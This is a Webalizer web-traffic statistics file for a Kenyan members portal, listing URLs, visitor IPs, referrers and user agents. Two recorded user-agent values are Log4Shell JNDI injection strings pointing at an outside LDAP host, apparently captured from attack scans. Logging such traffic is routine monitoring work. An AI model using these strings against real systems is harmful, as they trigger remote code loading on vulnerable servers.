@@ -1,0 +1,891 @@
+# Webalizer V2.23-08 Incremental Data - 12/14/2025 22:01:59
+2025 12 14 22 1 59
+1265 436 177 29 22 54 30577325 793 156 0
+12 2 571 1 14
+51 11 511273 15 36 13
+42 9 95521 16 27 11
+39 8 271572 16 20 10
+11 0 14885 7 6 4
+21 0 22590 10 10 7
+13 0 34175 10 8 7
+90 0 56759 12 62 10
+18 0 28722 11 11 7
+55 13 547532 16 37 14
+18 4 443346 9 10 7
+34 1 37537 15 21 9
+40 10 897083 18 21 12
+718 333 26179112 30 456 36
+115 47 1437218 12 68 9
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+0 0 0 0 0 0
+19 2 15358 14
+15 1 234526 6
+17 0 16688 12
+12 0 7756 7
+2 0 4310 2
+9 0 17684 6
+16 3 232778 8
+1 0 398 0
+30 8 486975 17
+110 45 1229913 67
+12 0 20059 5
+10 0 11557 3
+46 15 365961 36
+30 9 80294 21
+107 8 325903 73
+48 6 287241 38
+576 275 25321930 352
+84 42 475137 53
+14 1 17336 10
+27 1 30229 17
+28 12 1091190 13
+9 0 10656 4
+38 8 284293 26
+5 0 9153 3
+0
+0
+0
+436
+0
+0
+0
+0
+0
+6
+0
+232
+78
+0
+2
+0
+0
+0
+1
+0
+96
+410
+0
+4
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+0
+# -urls- 
+/members/register
+0 14 0 32651 1 0
+/members/orientation/Images/tabitha 2.jpg
+0 2 0 256086 0 0
+/Images/Leonard Karanja.jpg
+0 2 0 674524 0 0
+/members/css/style.css
+0 7 0 7037 0 0
+/members/orientation/orientation1
+0 20 0 171903 3 1
+/members/orientation/Images/Stem Sheldon.jpg
+0 2 0 1733818 0 0
+/members/orientation/Images/Alex Muchiri (1).jpg
+0 2 0 208266 0 0
+/members/orientation/Images/Dennis Muendo.jpg
+0 2 0 248374 0 0
+/Images/rond logo.png
+0 35 0 5838752 0 0
+/members/dashboard
+0 115 0 904349 3 2
+/members/orientation/Images/Isaac Mumo 2.jpg
+0 2 0 252380 0 0
+/members/bestp-info
+0 10 0 62238 1 0
+/members/index
+0 68 0 153692 12 3
+/members/orientation/Images/Mitchell Wanjiku.jpg
+0 2 0 2826436 0 0
+/members/orientation/Images/Elizabeth Mumo 2.jpg
+0 2 0 5931210 0 0
+/members/orientation/Images/sam lole.jpg
+0 2 0 5260028 0 0
+/members/orientation/Images/Danie Kyalo.jpg
+0 2 0 214663 0 0
+/members/profile
+0 49 0 331680 10 2
+/members/reset_password
+0 3 0 3288 0 0
+/members/orientation/Images/Flavian Arocho.jpg
+0 2 0 272324 0 0
+/members/contact_admin
+0 38 0 260997 0 0
+/members/view_posts
+0 32 0 173329 4 2
+/members/orientation/orientation2
+0 5 0 59680 0 0
+/members/orientation/Images/Nahashon Maina 2.jpg
+0 2 0 3174760 0 0
+/members/orientation/Images/morrin 322.jpg
+0 2 0 174584 0 0
+/members/orientation/Images/cupatron.jpg
+0 2 0 207068 0 0
+/members/ffc
+0 16 0 101005 1 1
+/members/orientation/Images/cmf (1).jpg
+0 2 0 87080 0 0
+/members/orientation/Images/silas mwenfda 321.jpg
+0 2 0 217936 0 0
+# End Of Table - urls
+# -sites- (monthly)
+52.37.126.203
+0 2 0 4318 1 1764950391
+-
+197.136.0.6
+0 5 0 1644 1 1765706035
+-
+74.7.244.3
+0 1 0 395 0 0
+-
+167.235.250.30
+0 2 0 4651 1 1765206208
+-
+74.7.228.31
+0 2 0 790 0 0
+-
+35.202.85.252
+0 2 0 716 1 1765110564
+-
+18.237.117.39
+0 2 0 652 1 1764703356
+-
+66.249.83.104
+0 1 0 4187 1 1765295161
+-
+74.125.213.9
+0 4 0 16824 1 1765644123
+-
+173.252.87.44
+0 1 0 398 0 0
+-
+74.7.243.219
+0 1 0 283 1 1764693554
+-
+52.11.154.173
+0 2 0 4310 1 1765616623
+-
+3.93.149.57
+0 1 0 286 1 1765379769
+-
+35.238.157.147
+0 1 0 4053 0 0
+-
+35.89.209.75
+0 2 0 629 1 1764820033
+-
+66.249.70.192
+0 2 0 8412 0 0
+-
+34.221.248.231
+0 2 0 4310 1 1765699598
+-
+69.171.230.115
+0 1 0 398 0 0
+-
+173.252.83.1
+0 1 0 398 0 0
+-
+74.7.244.29
+0 2 0 790 0 0
+-
+74.7.228.54
+0 1 0 395 0 0
+-
+35.91.122.106
+0 2 0 4310 1 1765532759
+-
+34.9.16.66
+0 1 0 4053 0 0
+-
+74.7.244.49
+0 1 0 395 0 0
+-
+74.7.242.5
+0 1 0 283 1 1764897136
+-
+173.252.95.115
+0 1 0 398 0 0
+-
+66.249.93.198
+0 1 0 4206 0 0
+-
+100.30.248.17
+0 3 0 8149 2 1765615956
+-
+52.37.253.147
+0 1 0 3974 1 1764999226
+-
+34.74.190.9
+0 2 0 724 1 1765222859
+-
+74.7.243.203
+0 1 0 283 1 1765570095
+-
+74.125.210.192
+0 2 0 8377 1 1765629537
+/members/ffc
+54.187.133.217
+0 2 0 4310 1 1764984810
+-
+159.89.127.165
+0 36 0 33123 1 1765117146
+-
+3.251.239.21
+0 1 0 4124 1 1765431124
+-
+74.7.241.184
+0 2 0 790 0 0
+-
+44.204.202.238
+0 1 0 433 1 1765379770
+-
+34.208.230.173
+0 4 0 8628 2 1764818690
+-
+35.247.47.202
+0 2 0 724 1 1765122123
+-
+205.169.39.210
+0 2 0 4384 1 1765591676
+-
+197.136.0.5
+0 4 2 214190 1 1765571160
+/members/index
+136.118.48.204
+0 2 0 716 1 1765221401
+-
+34.219.247.88
+0 2 0 4318 1 1765665951
+-
+35.91.135.208
+0 2 0 652 1 1764623063
+-
+34.219.173.125
+0 2 0 629 1 1765616771
+-
+197.248.167.213
+0 3 1 2924 1 1764785933
+/members/index
+74.125.213.8
+0 1 0 4227 1 1765641865
+-
+57.141.6.57
+0 1 0 286 1 1764797508
+-
+41.139.167.17
+0 6 4 427459 2 1765400302
+/members/index
+85.9.207.35
+0 2 0 8458 0 0
+-
+35.88.130.27
+0 2 0 652 1 1765500234
+-
+206.189.95.232
+0 36 0 17478 1 1765117146
+-
+197.136.183.22
+0 759 392 27288402 9 1765706290
+/members/profile
+44.242.140.130
+0 1 0 4105 1 1765008641
+-
+66.249.93.201
+0 5 2 21234 4 1765705552
+/members/register
+35.92.181.17
+0 2 0 629 1 1764984811
+-
+74.7.244.26
+0 1 0 395 0 0
+-
+52.13.136.80
+0 2 0 629 1 1765700852
+-
+173.252.70.12
+0 1 0 398 0 0
+-
+173.252.70.6
+0 1 0 398 0 0
+-
+74.125.210.135
+0 6 0 14110 2 1764683426
+-
+193.186.4.85
+0 1 1 2473 1 1765641763
+/members/index
+197.136.9.4
+0 3 0 1066 1 1765643303
+-
+74.7.241.26
+0 1 0 283 1 1765111603
+-
+66.249.93.200
+0 6 0 14273 2 1765295160
+-
+34.213.83.111
+0 2 0 4318 1 1764701712
+-
+74.7.243.250
+0 1 0 283 1 1765740997
+-
+54.229.32.223
+0 1 0 4124 1 1765321094
+-
+173.252.70.16
+0 1 0 398 0 0
+-
+216.73.216.112
+0 1 1 211000 0 0
+-
+66.102.9.132
+0 8 0 15157 3 1765644123
+-
+154.159.252.92
+0 4 2 214076 1 1765700321
+/members/index
+161.35.91.140
+0 4 0 9296 1 1764752050
+-
+34.220.96.58
+0 2 0 629 1 1764656704
+-
+44.252.12.127
+0 2 0 4310 1 1764570235
+-
+44.243.121.11
+0 2 0 629 1 1764738030
+-
+44.244.58.210
+0 2 0 4310 1 1764901576
+-
+173.252.87.33
+0 1 0 398 0 0
+-
+66.102.9.131
+0 2 0 8393 2 1765629411
+-
+74.7.228.62
+0 1 0 395 0 0
+-
+34.23.2.173
+0 2 0 724 1 1765123801
+-
+197.136.9.5
+0 14 4 429741 1 1765642434
+-
+44.255.45.34
+0 2 0 629 1 1765749719
+-
+74.7.175.129
+0 2 0 790 0 0
+-
+192.34.59.139
+0 4 0 9296 1 1765452434
+-
+64.226.126.21
+0 1 0 4053 1 1765559309
+-
+196.96.54.215
+0 10 5 229685 1 1765295160
+/members/profile
+74.7.241.5
+0 1 0 283 1 1764618355
+-
+197.248.235.209
+0 1 1 0 1 1765493509
+/members/index
+197.248.231.201
+0 22 8 250581 1 1764598483
+/members/index
+57.141.6.58
+0 1 0 398 1 1764785995
+-
+66.249.81.194
+0 7 0 22091 2 1765644123
+-
+34.231.195.239
+0 1 0 3854 1 1765518895
+-
+44.244.220.33
+0 1 0 3858 0 0
+-
+18.236.122.80
+0 2 0 652 1 1765584071
+-
+34.147.16.58
+0 1 0 3894 1 1765013659
+-
+216.73.216.63
+0 2 1 2835 1 1765500720
+/members/index
+44.244.93.219
+0 2 0 4310 1 1764735950
+-
+197.155.95.4
+0 3 2 213855 1 1765571163
+/members/index
+66.102.9.133
+0 3 0 5175 1 1765319715
+-
+173.252.87.112
+0 1 0 398 0 0
+-
+54.190.163.160
+0 2 0 629 1 1765533732
+-
+74.125.210.193
+0 5 0 13583 2 1765642301
+-
+74.7.241.149
+0 1 0 395 0 0
+-
+66.249.93.199
+0 2 0 4674 1 1764683423
+-
+66.249.70.193
+0 1 0 4206 0 0
+-
+184.73.189.76
+0 1 0 3854 1 1764618807
+-
+74.7.244.35
+0 2 0 790 0 0
+-
+3.96.175.195
+0 6 0 5476 1 1765585709
+-
+66.249.83.130
+0 1 0 4206 1 1765295162
+-
+54.200.87.196
+0 2 0 652 1 1764789469
+-
+74.125.210.134
+0 2 0 8441 2 1764683424
+-
+167.71.235.206
+0 4 0 9296 1 1765277496
+-
+34.211.112.205
+0 4 0 1281 2 1764950393
+-
+173.252.87.35
+0 1 0 398 0 0
+-
+54.188.198.132
+0 2 0 629 1 1764570236
+-
+44.220.48.213
+0 2 0 566 2 1765157901
+-
+205.169.39.1
+0 2 0 775 1 1765595036
+-
+102.0.13.150
+0 3 1 632 1 1764722432
+/members/index
+216.73.216.37
+0 4 0 1252 1 1765423185
+-
+54.190.12.163
+0 2 0 629 1 1764869048
+-
+173.252.83.115
+0 1 0 398 0 0
+-
+52.24.246.59
+0 2 0 4318 1 1764785004
+-
+44.251.239.249
+0 1 0 3858 0 0
+-
+74.7.175.147
+0 2 0 790 0 0
+-
+74.7.175.191
+0 1 0 395 0 0
+-
+74.7.242.37
+0 1 0 283 1 1765309964
+-
+35.93.58.210
+0 2 0 4310 1 1764653185
+-
+44.247.7.51
+0 2 0 4318 1 1765583087
+-
+74.125.213.7
+0 1 0 4232 1 1765641865
+/members/orientation/orientation1
+74.7.227.22
+0 1 0 283 1 1765465950
+-
+128.140.51.187
+0 2 0 4667 1 1765213568
+-
+74.7.241.148
+0 3 0 1185 0 0
+-
+74.125.210.194
+0 5 0 13675 2 1765642302
+-
+74.7.227.151
+0 1 0 283 1 1765107259
+-
+15.168.168.56
+0 1 0 4121 1 1765011275
+-
+54.186.65.10
+0 2 0 4318 1 1764867613
+-
+216.106.189.40
+0 6 0 1698 2 1765207645
+-
+139.59.15.183
+0 4 0 9344 1 1764963995
+-
+34.213.6.209
+0 2 0 4318 1 1765748853
+-
+66.249.81.195
+0 8 0 22661 2 1765642301
+-
+57.141.6.30
+0 1 0 398 1 1765461110
+-
+54.185.191.227
+0 2 0 629 1 1765667065
+-
+74.7.244.27
+0 1 0 395 0 0
+-
+173.252.82.4
+0 1 0 398 0 0
+-
+173.252.87.10
+0 1 0 398 0 0
+-
+34.90.191.83
+0 1 0 3894 1 1765013400
+-
+197.155.95.6
+0 5 0 1643 1 1765642000
+-
+74.125.210.136
+0 3 0 8920 2 1764683424
+-
+66.249.76.105
+0 1 0 4206 0 0
+-
+66.249.83.131
+0 2 0 8470 1 1765295161
+/members/profile
+66.249.81.193
+0 5 1 19596 2 1765641966
+/members/index
+74.7.244.33
+0 2 0 790 0 0
+-
+102.210.13.121
+0 3 2 213862 1 1765646697
+/members/index
+16.170.241.201
+0 6 0 5476 1 1765421213
+-
+13.60.169.9
+0 6 0 5476 1 1765468343
+-
+74.7.228.32
+0 1 0 395 0 0
+-
+35.90.128.69
+0 2 0 4318 1 1765498924
+-
+13.61.12.209
+0 2 0 8326 1 1765156917
+-
+173.252.87.47
+0 1 0 398 0 0
+-
+74.7.175.161
+0 1 0 395 0 0
+-
+74.7.242.18
+0 1 0 283 1 1764900506
+-
+69.171.249.9
+0 2 0 796 0 0
+-
+74.7.244.15
+0 1 0 395 0 0
+-
+173.252.70.13
+0 1 0 398 0 0
+-
+57.141.4.31
+0 1 0 286 1 1765377796
+-
+196.96.87.164
+0 19 9 49584 1 1764683513
+/members/register
+74.7.242.56
+0 1 0 283 1 1765293718
+-
+34.19.48.75
+0 2 0 716 1 1765120439
+-
+74.7.230.18
+0 2 0 790 0 0
+-
+138.197.156.205
+0 4 0 9344 1 1765362491
+-
+41.139.218.159
+0 8 3 222609 1 1764571528
+/members/dashboard
+74.7.228.38
+0 1 0 395 0 0
+-
+66.249.70.194
+0 1 0 4206 0 0
+-
+100.27.47.218
+0 2 0 536 1 1765379770
+-
+74.7.175.170
+0 1 0 395 0 0
+-
+173.252.87.7
+0 1 0 398 0 0
+-
+# End Of Table - sites (monthly)
+# -sites- (daily)
+197.136.0.6
+0 5 0 1644 1 1765706035
+-
+34.221.248.231
+0 2 0 4310 1 1765699598
+-
+197.136.183.22
+0 93 50 1200463 1 1765706290
+/members/profile
+66.249.93.201
+0 1 1 5870 1 1765705552
+/members/register
+52.13.136.80
+0 2 0 629 1 1765700852
+-
+74.7.243.250
+0 1 0 283 1 1765740997
+-
+154.159.252.92
+0 4 2 214076 1 1765700321
+/members/index
+44.255.45.34
+0 2 0 629 1 1765749719
+-
+34.213.6.209
+0 2 0 4318 1 1765748853
+-
+74.7.228.38
+0 1 0 395 0 0
+-
+66.249.70.194
+0 1 0 4206 0 0
+-
+74.7.175.170
+0 1 0 395 0 0
+-
+# End Of Table - sites (daily)
+# -referrers- 
+https://members.mustcu.or.ke/logout
+0 1
+https://members.mustcu.or.ke/members/index
+0 185
+https://members.mustcu.or.ke/members/profile
+0 51
+https://members.mustcu.or.ke/
+0 12
+https://members.mustcu.or.ke/members/orientation/orientation2
+0 37
+https://members.mustcu.or.ke/members/contact_admin
+0 91
+http://www.members.mustcu.or.ke
+0 12
+https://members.mustcu.or.ke/members/reset_password
+0 1
+https://members.mustcu.or.ke/members/view_posts
+0 27
+https://members.mustcu.or.ke/members/dashboard
+0 308
+http://members.mustcu.or.ke
+0 12
+https://members.mustcu.or.ke/members/orientation/orientation1
+0 34
+https://www.google.com/
+0 25
+- (Direct Request)
+0 355
+http://members.mustcu.or.ke/
+0 3
+https://members.mustcu.or.ke/members/register
+0 11
+http://www.members.mustcu.or.ke/
+0 2
+https://members.mustcu.or.ke/members/bestp-info
+0 16
+https://members.mustcu.or.ke/index
+0 3
+https://members.mustcu.or.ke/members/ffc
+0 27
+https://www.members.mustcu.or.ke/
+0 11
+https://www.mustcu.or.ke/
+0 41
+# End Of Table - referrers
+# -agents- 
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+0 157
+Mozilla/5.0 (Linux; Android 8.0.0; SM-G965U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile S
+0 20
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Sa
+0 8
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
+0 2
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+0 10
+Mozilla/5.0 (l9scan/2.0.235313e2034323e2131313e25393; +https://leakix.net)
+0 70
+Mozilla/5.0 (X11; Linux x86_64)
+0 3
+Python/3.14 aiohttp/3.13.2
+0 3
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.102 Safari/537.36 QuarkPC/
+0 5
+Mozilla/5.0 (Linux; U; Android 14; en-ke; CPH2641 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.
+0 13
+Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)
+0 2
+Mozilla/5.0 (iPad; CPU OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/143.0.7499.92 Mobile/15E148 Sa
+0 3
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote
+0 18
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+0 4
+Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+0 5
+curl/7.68.0
+0 4
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36; compat
+0 32
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124
+0 1
+${jndi:ldap://644760-ua.216.106.189.88/a}
+0 1
+python-httpx/0.27.2
+0 1
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
+0 1
+Mozilla/5.0 (Linux; Android 13; TECNO BG6 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.171
+0 10
+${jndi:ldap://255260-ua.216.106.189.88/a}
+0 1
+Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 
+0 8
+Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
+0 2
+Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36 (compatible; 
+0 79
+Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
+0 2
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+0 50
+Mozilla/5.0 (Linux; Android 14; en; TECNO BG6m Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0
+0 3
+Scrapy/2.13.3 (+https://scrapy.org)
+0 2
+Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; ClaudeBot/1.0; +claudebot@anthropic.com)
+0 7
+facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
+0 18
+Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36
+0 107
+Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
+0 4
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0
+0 1
+Chrome Privacy Preserving Prefetch Proxy
+0 1
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.1
+0 24
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+0 12
+python-httpx/0.28.1
+0 2
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+0 4
+Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36
+0 32
+Mozilla/5.0 (Linux; Android 13; TECNO BG6 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7444.174
+0 12
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+0 357
+Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36
+0 113
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+0 6
+Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.3; +https://openai.com/gptbot)
+0 11
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+0 8
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+0 1
+Mozilla/5.0 (X11; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0
+0 2
+meta-externalagent/1.1 (+https://developers.facebook.com/docs/sharing/webmasters/crawler)
+0 4
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
+0 2
+Mozilla/5.0 (compatible; CMS-Checker/1.0; +https://example.com)
+0 12
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0
+0 2
+Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A032F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.
+0 1
+# End Of Table - agents
+# -search strings- 
+# End Of Table - search strings
+# -usernames- 
+# End Of Table - usernames
